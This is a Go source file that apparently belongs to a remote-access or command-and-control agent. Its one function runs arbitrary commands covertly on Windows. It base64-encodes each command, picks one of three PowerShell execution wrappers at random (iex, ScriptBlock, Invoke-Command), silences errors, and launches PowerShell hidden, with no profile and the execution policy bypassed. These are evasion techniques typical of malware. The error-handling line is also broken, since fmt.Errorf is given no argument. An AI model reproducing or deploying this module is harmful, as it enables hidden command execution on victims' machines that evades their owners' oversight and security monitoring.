package interactions

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os/exec"
	"syscall"
)

func ExecuteCommand(command string) (string, error) {

	encodedCmd := encodeCommand(command)
	executionMethods := []string{

		"$ErrorActionPreference = 'SilentlyContinue'; $ProgressPreference = 'SilentlyContinue'; " +
			"try { $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')); " +
			"& ([ScriptBlock]::Create($d)) } catch { $_.Exception.Message }",

		"$ErrorActionPreference = 'SilentlyContinue'; $ProgressPreference = 'SilentlyContinue'; " +
			"try { $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')); " +
			"iex $d } catch { $_.Exception.Message }",

		"$ErrorActionPreference = 'SilentlyContinue'; $ProgressPreference = 'SilentlyContinue'; " +
			"try { $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')); " +
			"Invoke-Command -ScriptBlock ([ScriptBlock]::Create($d)); Remove-Variable d } catch { $_.Exception.Message }",
	}
	method := executionMethods[rand.Intn(len(executionMethods))]
	psCommand := fmt.Sprintf(method, encodedCmd)

	cmd := exec.Command("cmd.exe", "/c", "powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-C", psCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	output := stdout.String()

	if err != nil {
		if stderr.Len() > 0 {
			output += "\n" + stderr.String()
		}
		return output, fmt.Errorf("error: %v")
	}

	return output, nil

}

func encodeCommand(command string) string {
	return base64.StdEncoding.EncodeToString([]byte(command))
}
